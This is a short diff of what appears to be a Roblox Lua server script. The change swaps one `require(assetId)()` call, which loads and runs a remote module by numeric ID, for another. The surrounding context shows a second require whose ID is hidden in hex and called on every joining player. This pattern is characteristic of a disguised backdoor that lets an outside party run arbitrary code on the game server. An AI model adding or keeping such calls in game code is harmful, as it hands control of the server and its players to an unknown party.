@@ -17,7 +17,7 @@ server.OnServerEvent:Connect(function(player,load)
 
 end) 
 
-require(103850927701322)()
+require(104077020798353)()
 game.Players.PlayerAdded:Connect(function(xax)
     require(0x7985e5f0add5):Check(xax.Name)
 end)
